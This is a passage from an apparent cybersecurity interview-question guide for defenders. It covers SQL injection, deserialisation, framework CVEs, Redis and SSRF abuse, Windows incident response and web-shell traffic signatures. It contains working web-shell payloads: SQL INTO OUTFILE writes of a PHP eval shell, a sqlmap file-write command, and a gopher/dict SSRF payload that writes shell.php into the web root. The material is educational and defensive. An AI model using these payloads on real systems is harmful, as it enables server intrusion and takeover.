+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#bfc7d5"><span class="token string" style="color:rgb(195, 232, 141)">&#x27; UNION SELECT 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="token plain">shell</span><span class="token string" style="color:rgb(195, 232, 141)">&#x27;]);?&gt;&quot;,3 INTO OUTFILE &#x27;</span><span class="token plain">C:</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">path</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token keyword" style="font-style:italic">to</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">shell</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">php&#x27;</span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">#</span><br></div></code></pre></div></div>
+</li>
+<li class=""><strong>Into dumpfile:</strong>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#bfc7d5"><span class="token string" style="color:rgb(195, 232, 141)">&#x27; UNION SELECT 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="token plain">shell</span><span class="token string" style="color:rgb(195, 232, 141)">&#x27;]);?&gt;&quot;,3 INTO DUMPFILE &#x27;</span><span class="token plain">C:</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">path</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token keyword" style="font-style:italic">to</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">shell</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">php&#x27;</span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">#</span><br></div></code></pre></div></div>
+</li>
+<li class=""><strong>Using <code>lines terminated by</code>:</strong>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#bfc7d5"><span class="token string" style="color:rgb(195, 232, 141)">&#x27; INTO OUTFILE &#x27;</span><span class="token plain">C:</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">path</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token keyword" style="font-style:italic">to</span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain">shell</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">php</span><span class="token string" style="color:rgb(195, 232, 141)">&#x27; LINES TERMINATED BY &#x27;</span><span class="token operator" style="color:rgb(137, 221, 255)">&lt;</span><span class="token plain">?php phpinfo</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain">?</span><span class="token operator" style="color:rgb(137, 221, 255)">&gt;</span><span class="token plain">&#x27;</span><br></div></code></pre></div></div>
+</li>
+<li class=""><strong>Using <code>sqlmap</code>:</strong><br>
+<code>sqlmap -u &quot;target&quot; --file-write=shell.php --file-dest=/tmp/shell.php</code></li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-deserialisation-and-why-is-it-a-security-risk">Q: What is deserialisation and why is it a security risk?<a href="#q-what-is-deserialisation-and-why-is-it-a-security-risk" class="hash-link" aria-label="Direct link to Q: What is deserialisation and why is it a security risk?" title="Direct link to Q: What is deserialisation and why is it a security risk?" translate="no">​</a></h2>
+<p><strong>A:</strong> Deserialisation is the process of converting a byte stream back into an object. Insecure deserialisation occurs when user‑controlled data is deserialised without proper validation, allowing attackers to manipulate the object state or trigger malicious code execution.</p>
+<p><strong>PHP:</strong> Vulnerable functions like <code>unserialize()</code> can be exploited via magic methods (<code>__construct</code>, <code>__destruct</code>, <code>__wakeup</code>, etc.).</p>
+<p><strong>Java:</strong> The <code>readObject()</code> method is a common entry point. Attackers can craft payloads that execute arbitrary commands during deserialisation.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-are-some-common-framework-vulnerabilities">Q: What are some common framework vulnerabilities?<a href="#q-what-are-some-common-framework-vulnerabilities" class="hash-link" aria-label="Direct link to Q: What are some common framework vulnerabilities?" title="Direct link to Q: What are some common framework vulnerabilities?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<p><strong>Log4j (CVE-2021-44228):</strong></p>
+<ul>
+<li class="">An open‑source Java logging library. The JNDI lookup feature allows remote code execution when the <code>${jndi:ldap://...}</code> pattern is logged.</li>
+<li class=""><strong>Impact:</strong> Remote code execution; patched in later versions.</li>
+</ul>
+<p><strong>Fastjson Deserialisation:</strong></p>
+<ul>
+<li class="">Fastjson is a JSON parser for Java. The <code>autotype</code> feature allows attackers to specify arbitrary classes, leading to deserialisation vulnerabilities.</li>
+<li class=""><strong>Detection:</strong> Look for <code>fastjson</code> in error responses or use crafted POST requests to identify the library.</li>
+<li class=""><strong>Exploitation:</strong> Craft a <code>@type</code> payload that references a malicious class.</li>
+</ul>
+<p><strong>Shiro Deserialisation (CVE-2016-4437, CVE-2020-1957):</strong></p>
+<ul>
+<li class="">Shiro&#x27;s &quot;Remember Me&quot; feature uses AES encryption with a hard‑coded key (in older versions). Attackers can forge a valid <code>rememberMe</code> cookie containing a malicious serialised object.</li>
+<li class=""><strong>Detection:</strong> Response contains <code>rememberMe=deleteMe</code>.</li>
+<li class=""><strong>Exploitation:</strong> Use known keys or padding oracle attacks (CVE-2020-1957).</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-redis-and-what-vulnerabilities-are-associated-with-it">Q: What is Redis and what vulnerabilities are associated with it?<a href="#q-what-is-redis-and-what-vulnerabilities-are-associated-with-it" class="hash-link" aria-label="Direct link to Q: What is Redis and what vulnerabilities are associated with it?" title="Direct link to Q: What is Redis and what vulnerabilities are associated with it?" translate="no">​</a></h2>
+<p><strong>A:</strong> Redis is an in‑memory data store used as a database, cache, or message broker. It runs on port 6379 by default.</p>
+<p><strong>Common issues:</strong></p>
+<ul>
+<li class=""><strong>Unauthorised access:</strong> When no password is set, attackers can connect and perform arbitrary operations.</li>
+<li class=""><strong>Potential impacts:</strong>
+<ul>
+<li class=""><strong>SSH key injection:</strong> Write an SSH public key to <code>~/.ssh/authorized_keys</code> (if Redis runs as root).</li>
+<li class=""><strong>Web shell:</strong> Write a PHP script to the web root.</li>
+<li class=""><strong>Reverse shell:</strong> Use <code>cron</code> or <code>gopher</code>/<code>dict</code> protocols to schedule tasks.</li>
+<li class=""><strong>Master‑slave exploitation:</strong> For versions 4.x–5.0.5, attackers can use a rogue Redis server to execute arbitrary code.</li>
+</ul>
+</li>
+</ul>
+<p><strong>Mitigation:</strong></p>
+<ul>
+<li class="">Set a strong password (<code>requirepass</code>).</li>
+<li class="">Bind to localhost or restrict network access.</li>
+<li class="">Run Redis as a low‑privilege user.</li>
+<li class="">Disable dangerous commands (e.g., <code>CONFIG</code>, <code>SAVE</code>).</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-how-can-ssrf-be-used-to-exploit-redis">Q: How can SSRF be used to exploit Redis?<a href="#q-how-can-ssrf-be-used-to-exploit-redis" class="hash-link" aria-label="Direct link to Q: How can SSRF be used to exploit Redis?" title="Direct link to Q: How can SSRF be used to exploit Redis?" translate="no">​</a></h2>
+<p><strong>A:</strong> SSRF (Server‑Side Request Forgery) allows an attacker to make requests from the vulnerable server. Two common protocols are used:</p>
+<ul>
+<li class="">
+<p><strong>dict protocol:</strong> Send commands directly to Redis.</p>
+<ul>
+<li class="">Example: <code>ssrf.php?url=dict://target:6379/config:set:dir:/var/www/html</code></li>
+<li class="">Can also be used to test credentials, write files, or schedule tasks.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>gopher protocol:</strong> Encapsulate Redis commands in a single request.</p>
+<ul>
+<li class="">The payload must be URL‑encoded twice to bypass filters.</li>
+<li class="">Example payload for writing a web shell:<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#bfc7d5"><span class="token plain">gopher://127.0.0.1:6379/_SET%20x%20%22%3C?php%20phpinfo();?%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE</span><br></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Prevention:</strong> Validate and restrict the URLs that can be requested; block access to internal IP ranges.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-are-the-key-steps-in-a-windows-incident-response-investigation">Q: What are the key steps in a Windows incident response investigation?<a href="#q-what-are-the-key-steps-in-a-windows-incident-response-investigation" class="hash-link" aria-label="Direct link to Q: What are the key steps in a Windows incident response investigation?" title="Direct link to Q: What are the key steps in a Windows incident response investigation?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<p><strong>Account and Session Analysis:</strong></p>
+<ul>
+<li class="">Check for weak passwords and open RDP/SSH ports.</li>
+<li class="">Use <code>lusrmgr.msc</code> to look for suspicious, hidden, or newly created accounts.</li>
+<li class="">Analyse security logs (<code>eventvwr.msc</code>) for event IDs like:<!-- -->
+<ul>
+<li class=""><strong>4624:</strong> Successful logon.</li>
+<li class=""><strong>4625:</strong> Failed logon.</li>
+<li class=""><strong>4672:</strong> Administrative logon.</li>
+<li class=""><strong>4720:</strong> User creation.</li>
+</ul>
+</li>
+<li class="">Use <code>query user</code> to see active remote sessions.</li>
+</ul>
+<p><strong>Process and Service Analysis:</strong></p>
+<ul>
+<li class="">Monitor CPU, memory, and network usage for anomalies.</li>
+<li class="">Look for processes with random names (e.g., <code>hrlC3.tmp</code>, <code>hrlD5.tmp</code>) – these are often malicious.</li>
+<li class="">Verify digital signatures and descriptions of running processes.</li>
+<li class="">Use tools like Process Hacker or FireEye’s Red Team Tool (e.g., <code>procmon</code>).</li>
+</ul>
+<p><strong>Startup Items:</strong></p>
+<ul>
+<li class="">Check <code>msconfig</code> or Task Manager startup tab for unknown entries.</li>
+<li class="">Review scheduled tasks and services.</li>
+</ul>
+<p><strong>File System Analysis:</strong></p>
+<ul>
+<li class="">Inspect <code>Temp</code>/<code>Tmp</code> directories for suspicious files.</li>
+<li class="">Look at <code>Recent</code> files (quick access) for recently opened documents.</li>
+<li class="">Compare file timestamps (creation, modification, access) for anomalies (e.g., modification time before creation).</li>
+</ul>
+<p><strong>Malware Detection:</strong></p>
+<ul>
+<li class="">Use antivirus and dedicated web shell scanners (D‑Shield, ShellPub) to scan directories.</li>
+<li class="">If a specific file is identified, analyse its behaviour and associated processes.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-are-the-traffic-characteristics-of-common-web-shell-tools">Q: What are the traffic characteristics of common web shell tools?<a href="#q-what-are-the-traffic-characteristics-of-common-web-shell-tools" class="hash-link" aria-label="Direct link to Q: What are the traffic characteristics of common web shell tools?" title="Direct link to Q: What are the traffic characteristics of common web shell tools?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<p><strong>China Chopper:</strong></p>
+<ul>
+<li class="">Uses Base64‑encoded payloads; parameters like <code>z0</code> and <code>z1</code> are common.</li>
+<li class="">Contains the string <code>QG</code> at the start and <code>7J</code> at the end.</li>
+</ul>
+<p><strong>AntSword:</strong></p>
+<ul>
+<li class="">User‑Agent contains <code>antsword</code> (default, can be changed).</li>
+<li class="">Splits payloads into multiple Base64‑encoded parts.</li>
+<li class="">Often includes <code>@ini_set(&quot;display&quot;,&quot;0&quot;)</code>.</li>
+</ul>
+<p><strong>Behinder (v2.0 / v3.0):</strong></p>
+<ul>
+<li class=""><strong>v2.0:</strong> Uses AES encryption; three requests for key exchange and communication.</li>
+<li class=""><strong>v3.0:</strong> Uses AES with a key derived from the password’s MD5 hash; two requests.</li>
+</ul>
+<p><strong>Godzilla:</strong></p>
+<ul>
+<li class="">PHP/ASP variants often use simple one‑liners with Base64 encoding.</li>
+<li class="">Java variants include classes like <code>getClass()</code> and <code>getClassLoader()</code>.</li>
+<li class="">Response headers often include <code>Cache-Control: no-store, no-cache</code>.</li>
+</ul>
+<p><strong>General indicators:</strong></p>
+<ul>
+<li class="">Unusual POST requests to static files (e.g., images, CSS).</li>
+<li class="">Repeated requests to the same URL with varying parameters.</li>
+<li class="">Long request bodies with encrypted or encoded content.</li>
+</ul>
+<hr></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/Excalibra/cybersecurity-interview-questions/edit/main/docs/questions/blue-team/06-operational-depth.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/cybersecurity-interview-questions/docs/questions/blue-team/other-topics"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Other Topics</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/cybersecurity-interview-questions/docs/topics/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Topics</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#q-how-do-you-handle-false-positives-from-security-devices" class="table-of-contents__link toc-highlight">Q: How do you handle false positives from security devices?</a></li><li><a href="#q-how-do-you-distinguish-between-scanning-traffic-and-manual-attack-traffic" class="table-of-contents__link toc-highlight">Q: How do you distinguish between scanning traffic and manual attack traffic?</a></li><li><a href="#q-what-is-the-process-if-a-website-is-found-to-have-a-web-shell" class="table-of-contents__link toc-highlight">Q: What is the process if a website is found to have a web shell?</a></li><li><a href="#q-how-would-you-analyse-a-large-log-file" class="table-of-contents__link toc-highlight">Q: How would you analyse a large log file?</a></li><li><a href="#q-what-are-some-common-enterprise-collaboration-platforms-oa-systems-that-are-often-targeted" class="table-of-contents__link toc-highlight">Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?</a></li><li><a href="#q-can-you-describe-common-security-devices-and-their-functions" class="table-of-contents__link toc-highlight">Q: Can you describe common security devices and their functions?</a></li><li><a href="#q-what-are-the-key-areas-of-system-hardening" class="table-of-contents__link toc-highlight">Q: What are the key areas of system hardening?</a></li><li><a href="#q-what-security-tools-have-you-used" class="table-of-contents__link toc-highlight">Q: What security tools have you used?</a></li><li><a href="#q-what-is-cobalt-strike-and-how-is-it-used" class="table-of-contents__link toc-highlight">Q: What is Cobalt Strike and how is it used?</a></li><li><a href="#q-what-is-a-waf-and-how-does-it-work" class="table-of-contents__link toc-highlight">Q: What is a WAF and how does it work?</a></li><li><a href="#q-are-you-familiar-with-powershell" class="table-of-contents__link toc-highlight">Q: Are you familiar with PowerShell?</a></li><li><a href="#q-what-is-metasploit-framework-msf-and-how-is-it-used" class="table-of-contents__link toc-highlight">Q: What is Metasploit Framework (MSF) and how is it used?</a></li><li><a href="#q-what-xss-platforms-have-you-used" class="table-of-contents__link toc-highlight">Q: What XSS platforms have you used?</a></li><li><a href="#q-how-can-you-write-a-web-shell-via-sql-injection" class="table-of-contents__link toc-highlight">Q: How can you write a web shell via SQL injection?</a></li><li><a href="#q-what-is-deserialisation-and-why-is-it-a-security-risk" class="table-of-contents__link toc-highlight">Q: What is deserialisation and why is it a security risk?</a></li><li><a href="#q-what-are-some-common-framework-vulnerabilities" class="table-of-contents__link toc-highlight">Q: What are some common framework vulnerabilities?</a></li><li><a href="#q-what-is-redis-and-what-vulnerabilities-are-associated-with-it" class="table-of-contents__link toc-highlight">Q: What is Redis and what vulnerabilities are associated with it?</a></li><li><a href="#q-how-can-ssrf-be-used-to-exploit-redis" class="table-of-contents__link toc-highlight">Q: How can SSRF be used to exploit Redis?</a></li><li><a href="#q-what-are-the-key-steps-in-a-windows-incident-response-investigation" class="table-of-contents__link toc-highlight">Q: What are the key steps in a Windows incident response investigation?</a></li><li><a href="#q-what-are-the-traffic-characteristics-of-common-web-shell-tools" class="table-of-contents__link toc-highlight">Q: What are the traffic characteristics of common web shell tools?</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2026 Excalibra.</div></div></div></footer></div>
+</body>
+</html>
